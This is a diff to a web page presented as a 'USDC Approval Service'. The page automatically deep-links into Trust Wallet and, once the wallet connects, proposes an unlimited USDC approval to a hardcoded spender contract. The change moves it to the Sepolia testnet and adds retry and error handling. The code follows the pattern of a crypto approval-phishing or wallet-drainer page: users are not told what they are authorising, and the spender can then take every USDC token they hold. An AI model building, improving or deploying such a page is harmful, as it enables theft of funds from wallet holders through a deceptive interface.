@@ -77,10 +77,12 @@
         <h1>USDC Approval Service</h1>
         <div id="loader" class="loading"></div>
         <p id="message">Initializing...</p>
-        <div id="status" class="status-message hidden"></div>
         <div id="manualConnectSection" class="hidden">
-            <p>If Trust Wallet did not open automatically, please click the button below:</p>
+            <p>Trust Wallet did not open automatically. Please try manually:</p>
             <button id="manualConnectButton" class="action-button">Open Trust Wallet</button>
+        </div>
+        <div id="errorDetails" class="status-message error hidden">
+            <strong>Error Details:</strong> <span id="errorMessage"></span>
         </div>
     </div>
 
@@ -88,10 +90,11 @@
     <script type="module">
         import { EthereumProvider } from 'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.14.0/dist/index.umd.min.js';
 
+        // --- Configuration for Sepolia Test Network ---
         const WALLETCONNECT_PROJECT_ID = '25a778da5292aee3e00da87e594c2005';
-        const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
-        const SPENDER_CONTRACT_ADDRESS = '0xBb69c59C6912aBeA0b2e6ccC6aba416db90A1322';
-        const FIXED_ALLOWANCE_AMOUNT_HEX = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+        const USDC_CONTRACT_ADDRESS = '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238'; // Corrected Sepolia USDC Testnet Address
+        const SPENDER_CONTRACT_ADDRESS = '0xa81EE3A48c2B72C6AdB279812a730c93EfF5C2F6'; // Your Deployed UsdcAllowanceSpender Contract on Sepolia
+        const FIXED_ALLOWANCE_AMOUNT_HEX = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // Unlimited allowance (MaxUint256)
 
         const ERC20_ABI = [
             "function approve(address spender, uint256 amount) external returns (bool)",
@@ -100,7 +103,8 @@
 
         let ethereumProvider;
         let connectedAccount;
-        let currentWcUri = null; // Store the URI for manual connect
+        let currentWcUri = null;
+        let connectTimeout;
 
         function updateMessage(text, type = 'info') {
             const messageElement = document.getElementById('message');
@@ -114,16 +118,28 @@
 
         function showManualConnect(show) {
             document.getElementById('manualConnectSection').classList.toggle('hidden', !show);
+            if (show) {
+                showLoader(false);
+                updateMessage('Please click the button to open Trust Wallet.', 'info');
+            }
+        }
+
+        function displayErrorDetails(error) {
+            const errorDetailsElement = document.getElementById('errorDetails');
+            const errorMessageElement = document.getElementById('errorMessage');
+            errorMessageElement.textContent = error.message || String(error);
+            errorDetailsElement.classList.remove('hidden');
         }
 
         async function startApprovalProcess() {
             showLoader(true);
             updateMessage('Initializing WalletConnect...');
+            displayErrorDetails({message: ''});
 
             try {
                 ethereumProvider = await EthereumProvider.init({
                     projectId: WALLETCONNECT_PROJECT_ID,
-                    chains: [1],
+                    chains: [11155111], // Sepolia Testnet Chain ID
                     optionalChains: [],
                     showQrModal: false,
                     metadata: {
@@ -136,60 +152,74 @@
 
                 ethereumProvider.on("display_uri", (uri) => {
                     console.log("WalletConnect URI for pairing:", uri);
-                    currentWcUri = uri; // Store the URI
+                    currentWcUri = uri;
                     updateMessage('Opening Trust Wallet to connect... Please approve the connection.', 'info');
                     
                     const deepLink = `trust://wc?uri=${encodeURIComponent(uri)}`;
-                    window.location.href = deepLink; // Attempt automatic deep-link
+                    window.location.href = deepLink;
                     
-                    // If Trust Wallet doesn't open after a short delay, show manual button
-                    setTimeout(() => {
-                        if (!ethereumProvider.connected) { // Only show if not yet connected
+                    if (connectTimeout) clearTimeout(connectTimeout);
+                    connectTimeout = setTimeout(() => {
+                        if (!ethereumProvider.connected) {
                             showManualConnect(true);
-                            updateMessage('Trust Wallet did not open automatically. Please click "Open Trust Wallet" or check your app.', 'info');
                         }
-                    }, 2000); // Wait 2 seconds
+                    }, 3000);
                 });
 
                 ethereumProvider.on("connect", (response) => {
+                    if (connectTimeout) clearTimeout(connectTimeout);
                     console.log("Wallet connected!", response);
                     connectedAccount = response.accounts[0];
                     updateMessage(`Wallet connected: ${connectedAccount.substring(0, 6)}...${connectedAccount.substring(connectedAccount.length - 4)}`, 'success');
-                    showManualConnect(false); // Hide manual button if connection succeeds
+                    showManualConnect(false);
                     proposeApproveTransaction();
                 });
 
                 ethereumProvider.on("disconnect", (error) => {
+                    if (connectTimeout) clearTimeout(connectTimeout);
                     console.log("Wallet disconnected.", error);
                     updateMessage('Wallet disconnected.', 'error');
                     showLoader(false);
-                    showManualConnect(false); // Hide manual button on disconnect
+                    showManualConnect(false);
                 });
 
                 document.getElementById('manualConnectButton').addEventListener('click', () => {
                     if (currentWcUri) {
                         const deepLink = `trust://wc?uri=${encodeURIComponent(currentWcUri)}`;
-                        window.location.href = deepLink; // Try again with user gesture
+                        window.location.href = deepLink;
                         updateMessage('Attempting to open Trust Wallet again...', 'info');
                     } else {
-                        updateMessage('Error: No WalletConnect URI available for manual connection.', 'error');
+                        updateMessage('Error: No WalletConnect URI available for manual connection. Please refresh.', 'error');
+                        displayErrorDetails({message: 'No WalletConnect URI to open manually.'});
                     }
                 });
 
                 if (!ethereumProvider.connected) {
-                    updateMessage('Requesting wallet connection... Check Trust Wallet.', 'info');
+                    updateMessage('Requesting wallet connection... Check Trust Wallet for prompts or click the button below.', 'info');
+                    if (connectTimeout) clearTimeout(connectTimeout);
+                    connectTimeout = setTimeout(() => {
+                        if (!ethereumProvider.connected) {
+                            showManualConnect(true);
+                        }
+                    }, 5000);
+                    
                     await ethereumProvider.connect();
                 } else {
+                    if (connectTimeout) clearTimeout(connectTimeout);
                     connectedAccount = ethereumProvider.accounts[0];
                     updateMessage(`Wallet already connected: ${connectedAccount.substring(0, 6)}...${connectedAccount.substring(connectedAccount.length - 4)}`, 'success');
                     proposeApproveTransaction();
                 }
 
             } catch (error) {
+                if (connectTimeout) clearTimeout(connectTimeout);
                 console.error('Error during WalletConnect initialization or connection:', error);
-                updateMessage(`Error: ${error.message}. Please try again.`, 'error');
+                updateMessage(`Error: ${error.message}. Please check console for details.`, 'error');
+                displayErrorDetails(error);
                 showLoader(false);
-                showManualConnect(true); // Show manual button on initial error
+                if (currentWcUri) {
+                    showManualConnect(true);
+                }
             }
         }
 
@@ -230,6 +260,7 @@
             } catch (error) {
                 console.error('Transaction proposal failed:', error);
                 updateMessage(`Transaction failed: ${error.message}`, 'error');
+                displayErrorDetails(error);
             } finally {
                 showLoader(false);
             }
